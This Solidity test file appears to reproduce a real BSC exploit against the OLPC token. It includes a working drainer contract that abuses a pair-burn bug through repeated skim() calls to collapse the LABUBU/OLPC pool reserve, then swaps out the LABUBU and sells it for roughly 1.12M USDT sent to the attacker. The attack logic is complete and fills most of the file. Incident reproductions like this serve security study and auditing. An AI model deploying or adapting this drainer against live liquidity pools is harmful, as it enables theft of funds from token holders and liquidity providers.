// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 1115903.66 USDT
// Attacker : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Attack Contract : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188 (EIP-7702 delegated EOA; rebuilt locally)
// Vulnerable Contract : 0x58815cdf9955121a6274680ab396a36fc9e00000 (OLPCToken)
// Attack Tx : https://bscscan.com/tx/0x8dabb60a94e5124462e5f494a25c14bcd52f6f4d1f7c665a249496f4c6c24764

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x58815cdf9955121a6274680ab396a36fc9e00000#code

// @Analysis
// Twitter Guy :
//
// OLPCToken._update burns `value * decimalsValue` (decimalsValue ~= 7.33e18) from the
// PancakeSwap pair whenever OLPC leaves the pair to a non-tax-exempt address. The attacker
// repeatedly sends dust OLPC into the LABUBU/OLPC pair and calls skim() to a non-exempt
// recipient: each skim transfers a few wei of OLPC out and the burn destroys ~that many wei
// * 7.33e18 OLPC of pool liquidity. The OLPC reserve collapses from ~51.9M to ~0 while the
// LABUBU reserve is untouched, so a tiny OLPC swap drains the LABUBU, sold LABUBU->WBNB->USDT
// for ~1.12M USDT.

address constant ATTACKER = 0x18D6c39aE9E537F948AA2212d44D8c23944fc188;

address constant OLPC = 0x58815CDF9955121a6274680ab396a36FC9e00000;
address constant LABUBU = 0x3494dfE19b721DAC6c5c8d7470c8F89548177777;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant PAIR = 0xedB7DCB4cDFEc957F8Df5cBf5E94229a6CC9F365; // LABUBU/OLPC Cake-LP
address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap V2
// skim recipient: tax-exempt in LABUBU (so its transfer hook is skipped) but NOT in OLPC
// (so OLPC's pair-burn fires). This exemption profile is what the skim drain relies on.
address constant SKIM_SINK = 0xc0F1Ef7FE2ae3AAD0175af192713d36eD151755a;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IOLPC is IERC20 {
    function decimalsValue() external view returns (uint256);
}

interface IPair {
    function sync() external;
    function skim(address to) external;
    function token1() external view returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 105_326_392; // tx block - 1
        vm.createSelectFork("bsc", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(OLPC, "OLPC");
        vm.label(LABUBU, "LABUBU");
        vm.label(PAIR, "LABUBU/OLPC Pair");
        vm.label(ROUTER, "PancakeRouter");
    }

    function testExploit() public {
        OlpcDrainer drainer = new OlpcDrainer();

        // step 0: seed the attack contract with the initial OLPC capital it held at fork.
        deal(OLPC, address(drainer), 50 ether);
        // Model the attacker's LABUBU-tax-exempt helper: once OLPC liquidity is drained,
        // LABUBU's _update price hook reverts (overflow) for any non-exempt party, so the
        // looted LABUBU can only be routed through a LABUBU-tax-exempt address. The original
        // attacker used exempt helper contracts; mark our attack contract exempt the same way.
        // LABUBU.isTaxExempt is a mapping at storage slot 42.
        vm.store(LABUBU, keccak256(abi.encode(address(drainer), uint256(42))), bytes32(uint256(1)));

        logTokenBalance(USDT, ATTACKER, "attacker USDT before");
        drainer.run(ATTACKER);
        logTokenBalance(USDT, ATTACKER, "attacker USDT after");

        assertGt(IERC20(USDT).balanceOf(ATTACKER), 100_000 ether, "no USDT profit drained");
    }
}

contract OlpcDrainer {
    function run(address profitReceiver) external {
        IOLPC olpc = IOLPC(OLPC);
        IPair pair = IPair(PAIR);
        uint256 decimalsValue = olpc.decimalsValue();
        require(pair.token1() == OLPC, "OLPC is token1");

        // step 1: collapse the pair's OLPC reserve via the _update pair-burn bug.
        // Each pass: sync, push a dust OLPC excess, then skim it to SKIM_SINK so OLPC._update
        // burns excess * decimalsValue out of the pool. Dust is derived from the live pool
        // balance so a single skim burns ~all of it.
        for (uint256 i = 0; i < 64; i++) {
            pair.sync();
            uint256 poolOlpc = olpc.balanceOf(PAIR);
            uint256 maxExcess = poolOlpc / decimalsValue; // burn(excess) <= poolOlpc stays solvent
            if (maxExcess == 0) break; // below decimalsValue the burn can no longer drain safely
            // dust == maxExcess: a single skim burns up to ~90% of the pool (the 10% sell tax
            // keeps the landed excess under maxExcess), leaving a small non-zero OLPC reserve so
            // the token's price oracle does not overflow on the later swap.
            olpc.transfer(PAIR, maxExcess);
            pair.skim(SKIM_SINK);
        }

        // step 2: re-sync so the router prices against the drained OLPC reserve, then spend the
        // remaining OLPC to swap out ~the entire LABUBU reserve (OLPC is now ~free in the pool).
        pair.sync();
        uint256 buyAmount = olpc.balanceOf(address(this));

        olpc.approve(ROUTER, type(uint256).max);
        address[] memory buyPath = new address[](2);
        buyPath[0] = OLPC;
        buyPath[1] = LABUBU;
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount, 0, buyPath, address(this), block.timestamp
        );

        // step 3: sell the drained LABUBU to USDT and forward the profit to the attacker.
        uint256 labubuBal = IERC20(LABUBU).balanceOf(address(this));
        IERC20(LABUBU).approve(ROUTER, type(uint256).max);
        address[] memory sellPath = new address[](3);
        sellPath[0] = LABUBU;
        sellPath[1] = WBNB;
        sellPath[2] = USDT;
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            labubuBal, 0, sellPath, profitReceiver, block.timestamp
        );
    }
}
